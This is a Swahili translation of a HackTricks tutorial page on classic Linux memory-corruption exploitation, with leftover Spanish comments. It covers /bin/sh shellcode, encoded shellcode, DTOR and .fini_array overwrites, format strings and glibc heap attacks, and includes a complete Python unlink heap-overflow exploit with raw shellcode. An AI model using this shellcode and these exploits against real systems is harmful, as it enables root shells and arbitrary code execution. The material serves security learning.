# Kudukua Linux (Msingi) (SPA)

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **2.SHELLCODE**

Angalia mapumziko ya kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; safisha eax\
xor ebx, ebx ; ebx = 0 kwa sababu hakuna hoja ya kupitisha\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Tekeleza syscall

**nasm -f elf assembly.asm** ‚Äî> Inarudi .o\
**ld assembly.o -o shellcodeout** ‚Äî> Inatoa kutekelezeka iliyoundwa na msimbo wa mkusanyiko na tunaweza kutoa opcodes na **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kwamba kwa kweli ni shellcode yetu na kutoa OpCodes

**Thibitisha kwamba shellcode inafanya kazi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Ili kuhakikisha wito wa mfumo unafanywa kwa usahihi, lazima uunde programu iliyopita na wito wa mfumo uonekane katika **strace ./PROGRAMA\_COMPILADO**

Wakati wa kuunda shellcodes, unaweza kutumia hila. Maagizo ya kwanza ni jump kwenda kwa wito. Wito unaita msimbo wa asili na pia huingiza EIP kwenye stack. Baada ya maagizo ya wito tumeweka string tunayohitaji, kwa hivyo na EIP hiyo tunaweza kuelekeza kwa string na kuendelea kutekeleza msimbo.

EJ **HILA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Kutumia Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Mwindaji wa Yai:**

Inajumuisha nambari ndogo ambayo inatafuta kurasa za kumbukumbu zinazohusiana na mchakato kwa kutafuta shellcode iliyo ndani yake (inatafuta saini iliyowekwa kwenye shellcode). Inatumika katika hali ambapo kuna nafasi ndogo tu ya kuingiza nambari.

**Shellcodes za Polimofiki**

Hizi ni shell zilizofichwa ambazo zina nambari ndogo za kuzificha na kuziruka, zikitumia mbinu ya Call-Pop hii itakuwa **mfano wa kificho kilichofichwa kwa Cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Mbinu Zingine**

**Ret2Ret**

Inatumika wakati haiwezekani kuweka anwani ya stack kwenye EIP (inathibitisha kuwa EIP hauna 0xbf) au wakati haiwezekani kuhesabu mahali pa shellcode. Lakini, kazi yenye kasoro inakubali parameter (shellcode itawekwa hapa).

Kwa njia hii, kwa kubadilisha EIP na anwani ya **ret**, italeta anwani inayofuata (ambayo ni anwani ya kwanza ya argumenti ya kazi). Yaani, italeta shellcode.

Exploit itakuwa: SHELLCODE + Kujaza (hadi EIP) + **\&ret** (byte zinazofuata kwenye stack zinaelekeza mwanzo wa shellcode kwa sababu anwani ya argumenti iliyopita imewekwa kwenye stack)

Inaonekana kazi kama **strncpy** mara baada ya kukamilika hufuta kwenye stack anwani ambapo shellcode ilikuwa imehifadhiwa ikizuia mbinu hii. Yaani, anwani wanayoipitisha kama argumenti kwa kazi (ile inayohifadhi shellcode) inabadilishwa na 0x00 kwa hivyo wakati wa kuita **ret** ya pili inakutana na 0x00 na programu inakufa.

**Mbinu ya Murat**

Katika linux programu zote zinapangwa kuanzia 0xbfffffff

Kwa kuangalia jinsi stack ya mchakato mpya inavyojengwa katika linux, unaweza kuendeleza exploit ili programu ianzishwe katika mazingira ambayo variable pekee ni shellcode. Kisha anwani ya hii inaweza kuhesabiwa kama: addr = 0xbfffffff - 4 - strlen(JINA\_la\_programu\_kamili) - strlen(shellcode)

Kwa njia hii, unaweza kupata kwa urahisi anwani ambapo variable ya mazingira iko na shellcode.

Hii inawezekana kufanywa kwa sababu kazi ya execle inaruhusu kuunda mazingira ambayo ina variable za mazingira zinazotakiwa tu.

**Integer overflows**

Aina hii ya overflows hutokea wakati variable haijaandaliwa kusaidia nambari kubwa kama ile inayopitishwa, labda kwa kuchanganyikiwa kati ya variables zenye ishara na zisizo na ishara, kwa mfano:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Katika mfano uliopita tunaona kuwa programu inatarajia vigezo 2. La kwanza ni urefu wa string inayofuata na la pili ni string yenyewe.

Ikiwa tunaweka nambari hasi kama kigezo cha kwanza, itasema kuwa len < 256 na tutapita kizuizi hicho, na pia strlen(buffer) itakuwa ndogo kuliko l, kwani l ni unsigned int na itakuwa kubwa sana.

Aina hii ya overflows haikusudiwi kuandika kitu kwenye mchakato wa programu, bali kuzidi vichujio vilivyoundwa vibaya ili kutumia mapungufu mengine.

**Variables not initialized**

Haijulikani thamani ambayo inaweza kuchukua variable ambayo haijaanzishwa na inaweza kuwa ya kuvutia kuichunguza. Inaweza kuchukua thamani iliyokuwa ikichukuliwa na variable ya kazi ya awali na hii inaweza kudhibitiwa na mshambuliaji.

##

###

###

###

### **.fini\_array**

Kimsingi hii ni muundo na **functions ambazo zitaitwa** kabla ya programu kukamilika. Hii ni ya kuvutia ikiwa unaweza kuita **shellcode yako kwa kuruka kwenye anwani**, au katika hali ambapo unahitaji kurudi kwa main tena ili **kutumia format string mara ya pili**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Tafadhali kumbuka kwamba hii **haitasababisha** **mwanya wa milele** kwa sababu unaporudi kwenye kipengele kuu, canary atagundua, mwisho wa stack unaweza kuharibiwa na kazi haitaitwa tena. Kwa hivyo, utaweza **kuwa na utekelezaji mwingine** wa mwanya.

### **Fomati za String ili Kudumpisha Yaliyomo**

Fomati ya string inaweza kutumika pia kudumpisha yaliyomo kutoka kwenye kumbukumbu ya programu. Kwa mfano, katika hali ifuatayo kuna **variable ya ndani kwenye stack inayoelekeza kwenye bendera.** Ikiwa **utapata** mahali **kwenye kumbukumbu** ambapo **pointer** kwa **bendera** iko, unaweza kufanya **printf kufikia** anwani hiyo na **kuchapisha** bendera:

Kwa hivyo, bendera iko kwenye **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Na kutoka kwa uvujaji unaweza kuona **pointer kwa bendera** iko kwenye **parameter ya 8**:

![](<../../.gitbook/assets/image (623).png>)

Kwa hivyo, **kufikia parameter ya 8** unaweza kupata bendera:

![](<../../.gitbook/assets/image (624).png>)

Tafadhali kumbuka kufuatia **udanganyifu uliopita** na kugundua kwamba unaweza **kuvuja yaliyomo** unaweza **kuweka pointers** kwa **`printf`** kwenye sehemu ambapo **kutekelezeka** imesha **pakia** na **kudump** kabisa!

### **DTOR**

{% hint style="danger" %}
Leo ni nadra sana **kupata binary na sehemu ya dtor**.
{% endhint %}

Waharibifu ni kazi ambazo **hutekelezwa kabla ya programu kukamilika**. Ikiwa utaweza **kuandika** anwani ya **shellcode** kwenye **`__DTOR_END__`**, hiyo itatekelezwa kabla ya programu kukamilika. Pata anwani ya sehemu hii na:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Kawaida utapata sehemu ya **DTOR** **kati ya** thamani `ffffffff` na `00000000`. Kwa hivyo ikiwa unauona tu thamani hizo, inamaanisha kwamba **hakuna kazi iliyosajiliwa**. Kwa hivyo **badilisha** **`00000000`** na **anwani** ya **shellcode** ili kuitekeleza.

### **Fomati za Strings kwa Buffer Overflows**

**sprintf** inahamisha string iliyopangwa **kwa** **variable.** Kwa hivyo, unaweza kutumia **upangaji** wa string kusababisha **buffer overflow kwenye variable** ambapo maudhui yanakopwa.\
Kwa mfano, payload `%.44xAAAA` itaandika **44B+"AAAA" kwenye variable**, ambayo inaweza kusababisha buffer overflow.

### **Miundo ya \_\_atexit**

{% hint style="danger" %}
Leo ni **kigeni kuitumia hii**.
{% endhint %}

**`atexit()`** ni kazi ambayo **kazi zingine hupitishwa kama parameta.** Hizi **kazi** zitatekelezwa wakati wa kutekeleza **`exit()`** au **kurudi** kwa **kazi kuu**.\
Ikiwa unaweza **kubadilisha** **anwani** ya mojawapo ya hizi **kazi** ili ielekee kwenye shellcode kwa mfano, utapata **udhibiti** wa **mchakato**, lakini hii ni ngumu zaidi kwa sasa.\
Kwa sasa **anwani za kazi** zitakazotekelezwa zimefichwa nyuma ya miundo kadhaa na mwishowe anwani ambayo inaelekezwa sio anwani za kazi, bali zime **fichwa kwa XOR** na viondoleo na **funguo la nasibu**. Kwa hivyo, vector huu wa shambulio sio wa manufaa sana angalau kwenye x86 na x64\_86.\
Kazi ya **kuandika** ni **`PTR_MANGLE`**. **Miundo mingine** kama m68k, mips32, mips64, aarch64, arm, hppa... **hazitekelezi kazi ya kuficha** kwa sababu **inarejesha sawa** na ilivyopokea kama kuingia. Kwa hivyo miundo hii inaweza kushambuliwa kupitia vector huu.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Leo ni **kigeni kuitumia hii**.
{% endhint %}

**`Setjmp()`** inaruhusu **kuhifadhi** **muktadha** (virejista)\
**`longjmp()`** inaruhusu **kurudisha** **muktadha**.\
Virejista vilivyohifadhiwa ni: `EBX, ESI, EDI, ESP, EIP, EBP`\
Kile kinachotokea ni kwamba EIP na ESP vinapitishwa na **`PTR_MANGLE`** kwa hivyo **usalama wa miundo hii ni sawa na hapo juu**.\
Ni muhimu kwa kupona makosa au kuingilia kati.\
Hata hivyo, kulingana na nilichosoma, virejista vingine havilindwi, **kwa hivyo ikiwa kuna `call ebx`, `call esi` au `call edi`** ndani ya kazi inayoitwa, udhibiti unaweza kuchukuliwa. Au unaweza pia kubadilisha EBP ili kubadilisha ESP.

**VTable na VPTR katika C++**

Kila darasa lina **Vtable** ambayo ni safu ya **pointa kwa njia**.

Kila kitu cha **darasa** kina **VPtr** ambayo ni **pointa** kwa safu ya darasa yake. VPtr ni sehemu ya kichwa cha kila kitu, kwa hivyo ikiwa **ubadilishaji** wa **VPtr** unafanikiwa unaweza kuibadilisha ili **ielekee** kwa njia bandia ili kutekeleza kifaa ielekee kwenye shellcode.

## **Hatua za Kuzuia na Kuepuka**

###

**Kuchukua Nafasi ya Libsafe**

Inaanzishwa na: LD\_PRELOAD=/lib/libsafe.so.2\
au\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Inazuia wito kwa baadhi ya kazi hatari kwa kazi salama. Haijathibitishwa (kwa x86 tu, sio kwa ujenzi na -fomit-frame-pointer, sio ujenzi wa static, sio kila kazi hatari inageuzwa kuwa salama na LD\_PRELOAD haifanyi kazi kwa binari zenye suid).

**Nafasi ya Anwani ya Nafasi ya ASCII**

Inahusisha kupakia maktaba zilizoshirikishwa kutoka 0x00000000 hadi 0x00ffffff ili kuhakikisha kila wakati kuna byte 0x00. Walakini, hii haizuili karibu shambulio lolote, haswa kwa little endian.

**ret2plt**

Inahusisha kufanya ROP ili kuita kazi ya strcpy@plt (kutoka kwa plt) na kuelekeza kuingia ya GOT na kunakili byte ya kwanza ya kazi inayotaka kuitwa (system()). Kisha unafanya hivyo kwa GOT+1 na kunakili byte ya pili ya system()‚Ä¶ Mwishowe unaita anwani iliyohifadhiwa kwenye GOT ambayo itakuwa system()

**Jela na chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Inasakinisha mfumo wa msingi chini ya saraka maalum

Msimamizi anaweza kutoka kwenye mojawapo ya majela haya kwa kufanya: mkdir foo; chroot foo; cd ..

**Ugunduzi wa Kanuni**

Valgrind ‚Äî> Inatafuta makosa\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Mwambukizi wa Heap: Mashambulizi ya Msingi**

**Kipande kilichopewa**

prev\_size |\
size | ‚ÄîKichwa\
\*mem | Data

**Kipande huru**

prev\_size |\
size |\
\*fd | Ptr mbele ya kipande\
\*bk | Ptr nyuma ya kipande ‚ÄîKichwa\
\*mem | Data

Vipande huru viko kwenye orodha iliyofungwa mara mbili (bin) na kamwe haziwezi kuwa na vipande huru viwili pamoja (hukusanyika)

Kuna bits kwenye "size" ambayo inaonyesha: Ikiwa kipande kilichotangulia kina matumizi, ikiwa kipande kimepewa kwa kutumia mmap() na ikiwa kipande ni sehemu ya uwanja wa msingi.

Ikiwa unapofuta kipande kimoja, vipande vya karibu vinapokuwa huru, hivi hufungwa pamoja kupitia macro unlink() na kipande kipya kikubwa hupitishwa kwa frontlink() ili kiingizwe kwenye bin sahihi.

unlink(){\
BK = P->bk; ‚Äî> BK ya kipande kipya ni ile iliyokuwa kipande kilichokuwa huru awali\
FD = P->fd; ‚Äî> FD ya kipande kipya ni ile iliyokuwa kipande kilichokuwa huru awali\
FD->bk = BK; ‚Äî> BK ya kipande kinachofuata inaelekeza kwenye kipande kipya\
BK->fd = FD; ‚Äî> FD ya kipande kilichotangulia inaelekeza kwenye kipande kipya\
}

Kwa hivyo, ikiwa tunaweza kubadilisha P->bk na anwani ya shellcode na P->fd na anwani ya kuingia kwenye GOT au DTORS chini ya 12 tunaweza kufanikisha:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Na hivyo shellcode itatekelezwa wakati programu inamalizika.

Zaidi, sentensi ya 4 ya unlink() inaandika kitu na shellcode lazima ibadilishwe kwa hili:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Hii husababisha kuandika byte 4 kutoka kwa byte ya 8 ya shellcode, kwa hivyo maagizo ya kwanza ya shellcode lazima iwe ni jmp ili kupita hili na kuingia kwenye nops ambayo itaendelea na shellcode.

Kwa hivyo shambulio linajengwa:

Kwenye buffer1 tunaweka shellcode ikiwaanza na jmp ili iingie kwenye nops au kwenye sehemu nyingine ya shellcode.

Baada ya shell code tunaweka kujaza hadi kufikia uwanja wa prev\_size na size wa kipande kinachofuata. Mahali hapa tunaweka 0xfffffff0 (ili kubadilisha prev\_size ili iwe na bit inayosema kuwa ni huru) na ‚Äú-4‚Äú(0xfffffffc) kwenye size (ili wakati wa kuchunguza kipande cha 3 ikiwa kipande cha 2 kilikuwa huru kweli itaenda kwa prev\_size iliyobadilishwa ambayo itaambia kuwa ni huru) -> Kwa hivyo wakati free() inachunguza itaenda kwa size ya 3 lakini kwa kweli itaenda kwa 2 - 4 na kufikiria kuwa kipande cha 2 ni huru. Na kisha itaita **unlink()**.

Kwa kuita unlink() itatumia kama P->fd data za kwanza za kipande cha 2 kwa hivyo anwani inayotaka kubadilishwa - 12 (kwa sababu katika FD->bk itaongeza 12 kwa anwani iliyohifadhiwa kwenye FD) itaingizwa hapo. Na kwenye anwani hiyo itaingiza anwani ya pili inayopatikana kwenye kipande cha 2, ambayo itakuwa anwani ya shellcode(P->bk bandia).
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Tunadhibiti vitu 3 vya chunks mfululizo na kuvifungua kwa mpangilio wa nyuma kwenda mbele.

Katika kesi hiyo:

Katika chunk c, shellcode inawekwa

Chunk a tunatumia kusajili b ili kubadilisha ukubwa ili biti ya PREV\_INUSE iwe imezimwa ili iweze kufikiri chunk a iko wazi.

Zaidi ya hayo, ukubwa unabadilishwa kwenye kichwa cha b ili iwe -4.

Kwa hivyo, programu itafikiri "a" iko wazi na kwenye bin, kwa hivyo itaita unlink() kuiondoa. Walakini, kwa kuwa kichwa cha PREV\_SIZE ni -4. Itafikiri kwamba kipande cha "a" kwa kweli kinaanza kwenye b+4. Yaani, itafanya unlink() kwa kipande kinachoanza kwenye b+4, kwa hivyo kwenye b+12 kutakuwa na pointer "fd" na kwenye b+16 kutakuwa na pointer "bk".

Kwa njia hii, tukiweka anwani ya shellcode kwenye bk na anwani ya kazi ya "puts()" -12 kwenye fd tunapata payload yetu.

**Mbinu ya Frontlink**

Frontlink inaitwa wakati kitu kinapofutwa na hakuna vipande vyake vya jirani vilivyo wazi, unlink() haitelewi bali frontlink() inaitwa moja kwa moja.

Udhaifu ni muhimu wakati malloc inayoshambuliwa kamwe haiachi (free()).

Inahitaji:

Buffer ambalo linaweza kufurika na kazi ya kuingiza data

Buffer unaoambatana na huu ambao unapaswa kufutwa na ambao shamba la fd la kichwa chake litabadilishwa kwa sababu ya kufurika kwa buffer uliopita

Buffer ya kufutwa na ukubwa mkubwa kuliko 512 lakini ndogo kuliko buffer uliopita

Buffer iliyotangazwa kabla ya hatua ya 3 ambayo inaruhusu kufuta prev\_size yake

Kwa njia hii, kwa kufanikiwa kufuta katika mallocs mbili kwa njia isiyo na kudhibitiwa na moja kwa njia inayodhibitiwa lakini inayofutwa tu, tunaweza kufanya shambulio.

**Udhaifu wa double free()**

Ikiwa free() inaitwa mara mbili na pointer sawa, kuna bins mbili zinazoashiria kwa anwani ile ile.

Ikiwa unataka kutumia moja tena, itapewa bila shida. Ikiwa unataka kutumia nyingine, itapewa nafasi ile ile kwa hivyo tutakuwa na pointers "fd" na "bk" zilizodanganywa na data itakayowekwa na akiba ya awali.

**Baada ya free()**

Pointer iliyofutwa awali inatumika tena bila kudhibitiwa.

## **8 Mafuriko ya Heap: Exploits ya juu**

Mbinu za Unlink() na FrontLink() ziliondolewa kwa kubadilisha kazi ya unlink().

**The house of mind**

Wito mmoja tu wa free() unahitajika kusababisha utekelezaji wa nambari ya aina yoyote. Ni muhimu kutafuta kipande cha pili ambacho kinaweza kufurikwa na kimoja kilichotangulia na kufutwa.

Wito wa free() husababisha wito wa public\_fREe(mem), hii inafanya:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Inarudisha pointer kwa anwani ambapo kipande kinaanza (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Katika \[1] inachunguza shamba la ukubwa la NON\_MAIN\_ARENA, ambalo linaweza kubadilishwa ili uhakiki urudiwe kweli na kutekeleza heap\_for\_ptr() ambayo inafanya and kwa "mem" ikiiacha 0.5 bytes ya chini zaidi (katika kesi yetu ya 0x0804a000 inaacha 0x08000000) na kufikia 0x08000000->ar\_ptr (kama vile ni muundo wa struct heap\_info)

Kwa njia hii, ikiwa tunaweza kudhibiti kipande kwa mfano kwenye 0x0804a000 na kipande kitafutwa kwenye **0x081002a0** tunaweza kufikia anwani ya 0x08100000 na kuandika chochote tunachotaka, kwa mfano **0x0804a000**. Wakati kipande cha pili kitakapofutwa, itagundua kwamba heap\_for\_ptr(ptr)->ar\_ptr inarudi kile tulichoandika kwenye 0x08100000 (kwa sababu inatumia and kama ilivyoonekana hapo awali na kutoka hapo inachukua thamani ya bytes 4 za kwanza, ar\_ptr)

Kwa njia hii, wito wa \_int\_free(ar\_ptr, mem) unaitwa, yaani, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kama tulivyoona hapo awali tunaweza kudhibiti thamani ya av, kwa hivyo ndio tunachoandika kwenye kipande kitakachofutwa.

Kama ilivyoelezwa katika unsorted\_chunks, tunajua kwamba:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Kwa hivyo ikiwa tunaweza kuandika thamani ya \_\_DTOR\_END\_\_-12 kwenye av->bins\[2] katika maagizo ya mwisho itaandikwa kwenye \_\_DTOR\_END\_\_ anwani ya kipande cha pili.

Yaani, kwenye kipande cha kwanza tunapaswa kuweka mwanzoni mara nyingi anwani ya \_\_DTOR\_END\_\_-12 kwa sababu hiyo ndio av->bins\[2] itakayochukua.

Kwenye anwani ambayo anwani ya kipande cha pili itaanguka na sifuri za mwisho tano, tunapaswa kuandika anwani ya kipande cha kwanza ili heap\_for\_ptr() iweze kufikiria kwamba ar\_ptr iko mwanzoni mwa kipande cha kwanza na kuchukua av->bins\[2] kutoka hapo

Kwenye kipande cha pili na kwa msaada wa kwanza tunabadilisha prev\_size na jump 0x0c na ukubwa na kitu cha kuamsha -> NON\_MAIN\_ARENA

Kisha kwenye kipande cha pili tunaweka nyingi za nops na mwishowe shellcode

Kwa njia hii, wito wa \_int\_free(TROZO1, TROZO2) utaitwa na itaendelea na maagizo ya kuandika kwenye \_\_DTOR\_END\_\_ anwani ya prev\_size ya TROZO2 ambayo itaruka kwenye shellcode.
Ili kutumia mbinu hii, mahitaji fulani lazima yatimizwe ambayo yanafanya payload kuwa ngumu kidogo zaidi.

Mbinu hii sasa haitekelezeki kwa sababu karibu na hilo, kipande cha programu kilichotumika kwa unlink kilitumika. Wanalinganisha ikiwa tovuti mpya inayolengwa pia inalenga kwao.

**Fastbin**

Ni aina ya The house of mind

Tunataka kutekeleza kanuni ifuatayo ambayo inafikiwa baada ya ukaguzi wa kwanza wa kazi \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Ikiwa fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Kwa njia hii, ikiwekwa kwenye "fb" inatoa anwani ya kazi kwenye GOT, kwenye anwani hii anwani ya kipande kilichobadilishwa itawekwa. Kwa hili, itakuwa muhimu kwamba uwanja uko karibu na anwani za dtors. Hasa, av->max\_fast iko kwenye anwani ambayo tunataka kubadilisha.

Kwa kuwa na The House of Mind tuliona kwamba sisi tulidhibiti nafasi ya av.

Kwa hivyo, ikiwa tunaweka ukubwa wa 8 + NON\_MAIN\_ARENA + PREV\_INUSE kwenye uga wa ukubwa ‚Äî> fastbin\_index() itarudisha fastbins\[-1], ambayo italenga av->max\_fast

Katika kesi hii av->max\_fast itakuwa anwani ambayo itabadilishwa (sio anwani ambayo inalengwa, lakini nafasi hiyo itabadilishwa).

Pia, kipande kinachopakana na kile kilichofutwa lazima kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema ukubwa wa kipande kilichofutwa ni 8, kwenye kipande hiki bandia tunahitaji tu kuweka ukubwa mkubwa kuliko 8 (kwa kuongezea, shellcode itaenda kwenye kipande kilichofutwa, itabidi tuweke mwanzoni mwa jmp ambayo itaanguka kwenye nops).

Pia, kipande hicho bandia lazima kiwe kidogo kuliko av->system\_mem. av->system\_mem iko 1848 bytes mbali.

Kwa sababu ya nulls za \_DTOR\_END\_ na anwani chache kwenye GOT, hakuna anwani kutoka sehemu hizi zinazofaa kubadilishwa, kwa hivyo tuone jinsi ya kutumia fastbin kushambulia safu.

Njia nyingine ya shambulio ni kuelekeza **av** kuelekea safu.

Ikiwa tunabadilisha ukubwa ili iwe 16 badala ya 8 basi: fastbin\_index() itarudisha fastbins\[0] na tunaweza kutumia hii kubadilisha safu.

Kwa hili, hakuna canary au thamani za ajabu kwenye safu, kwa kweli tunapaswa kuwa katika hali hii: 4bytes za null + EBP + RET

4bytes za null zinahitajika ili **av** iwe kwenye anwani hii na kipengele cha kwanza cha **av** ni mutex ambayo lazima iwe 0.

**av->max\_fast** itakuwa EBP na itakuwa thamani ambayo itatusaidia kusonga vizuizi.

Kwenye **av->fastbins\[0]** itabadilishwa na anwani ya **p** na itakuwa RET, hivyo itaruka kwenye shellcode.

Pia, kwenye **av->system\_mem** (1484bytes juu ya nafasi kwenye safu) kutakuwa na takataka nyingi ambazo zitaruhusu kusonga ukaguzi uliofanywa.

Pia, kipande hicho bandia lazima kiwe kikubwa kuliko kipande kilichofutwa lazima kiwe kikubwa kuliko 8 -> Kwa kuwa tumesema ukubwa wa kipande kilichofutwa ni 16, kwenye kipande hiki bandia tunahitaji tu kuweka ukubwa mkubwa kuliko 8 (kwa kuongezea, shellcode itaenda kwenye kipande kilichofutwa, itabidi tuweke mwanzoni mwa jmp ambayo itaanguka kwenye nops zinazofuata baada ya uga wa ukubwa wa kipande kipya bandia).

**The House of Spirit**

Katika kesi hii tunatafuta kuwa na pointer kwa malloc ambayo inaweza kubadilishwa na mshambuliaji (kwa mfano, pointer iko kwenye stack chini ya overflow inayowezekana kwa kipengee).

